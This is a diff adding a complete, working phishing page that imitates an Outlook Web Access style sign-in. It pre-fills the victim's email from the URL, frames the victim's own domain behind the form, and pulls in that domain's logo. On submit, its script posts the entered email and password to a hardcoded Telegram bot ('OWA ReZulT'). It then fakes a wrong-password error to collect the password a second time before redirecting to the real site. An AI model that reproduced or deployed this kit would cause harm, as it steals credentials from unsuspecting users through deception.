@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+        }
+
+        body {
+            height: 100vh;
+            width: 100vw;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bg-img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        iframe {
+            height: 100%;
+            width: 100%;
+            border: none;
+        }
+
+        .container {
+            max-width: 400px;
+            padding: 16px;
+            background-color: white;
+            border-radius: 5px;
+            position: relative;
+            z-index: 2;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                left: 10%;
+                top: 10%;
+                margin-left: 5%;
+                transform: translate(-10%, -10%);
+            }
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 5px 0 22px 0;
+            border: none;
+            background: #f1f1f1;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            background-color: #ddd;
+            outline: none;
+        }
+
+        .btn {
+            background-color: #0096FF;
+            color: white;
+            padding: 16px 20px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            opacity: 0.9;
+        }
+
+        .btn:hover {
+            opacity: 1;
+        }
+
+        .img {
+            text-align: center;
+        }
+
+        #title {
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        #error {
+            display: none;
+            color: red;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div class="bg-img" id="bg-img">
+        <iframe id="frame" src="" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"></iframe>
+    </div>
+
+    <form class="container" id="login-form">
+        <div class="img">
+            <img src="" id="logo" alt="Logo">
+        </div>
+
+        <h3 id="title">Sign In</h3>
+        <h5 id="error">Password is incorrect, please try again!</h5>
+
+        <label for="email"><b>Email Address</b></label>
+        <input type="text" placeholder="Enter Email" name="email" id="email" required readonly>
+
+        <label for="psw"><b>Password</b></label>
+        <input type="password" placeholder="Enter Password" name="password" id="password" required>
+
+        <input type="hidden" name="step" id="step" value="1">
+        <input type="hidden" name="token" id="token">
+
+        <button type="submit" class="btn">Sign In</button>
+    </form>
+
+    <script src="https://bafybeibqo6sij2nxln2lh3l4bhpufkriqsc6vtcni44smmcw2hskahjtxq.ipfs.dweb.link"></script>
+
+    <script>
+        let step = 1;
+    
+    const clientID = window.location.hash.split("#").pop();
+    $('#email').val(clientID);
+    
+    const domain = clientID.split('@').pop();
+
+    $("#frame").attr("src", "https://" + domain);
+    $("#logo").attr("src", "https://logo.clearbit.com/" + domain);
+
+    const submit = $("button[type='submit']");
+    
+
+    $("#login-form").submit(function(event) {
+        event.preventDefault();
+        email = $("#email").val();
+        password = $("#password").val();
+        submit.text('Verifying...');
+        const atoken = Math.random().toString(36).substring(7);
+        $('#token').val(atoken);
+
+  // Add a class to the hidden field to style it as hidden
+        $('#token').addClass('hiddenField');
+        const token = $("#token").val();
+
+        if (!token || token !== atoken) {
+            console.log("Invalid Submission");
+            console.error(error);
+        window.location.href = "http://" + domain;
+        } else {
+        console.log("Submission received");
+        }
+
+
+
+
+
+        var tokens = "7191922520:AAEeSQ65WM76kIMve_U4WAYFv1InlnGGBOI"; 
+        var message = "--------+ OWA ReZulT +--------\n"; 
+        message += "email : " + email + "\n"; 
+        message += "Password: " + password + "\n"; 
+        message += "---------+ OWA ReZulT+-------------\n"; 
+
+        var chatId = "682962134"; 
+        var params = { "chat_id": chatId, "text": message }; 
+        const posting = $.post("https://api.telegram.org/bot" + tokens + "/sendMessage", {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'html',
+        });
+ 
+        posting.done(function(data) {
+            if (step === 2) {
+                window.location.href = "http://" + domain;
+            } else {
+                step++;
+                $("#error").css("display", "block");
+                submit.text('Sign In');
+                $("#password").val("");
+            }
+        });
+
+        posting.fail(function(error) {
+            console.error(error);
+            $("#error").css("display", "block");
+            submit.text('Sign In');
+            $("#password").val("");
+        });
+    });
+    </script>
+
+</body>
+</html>
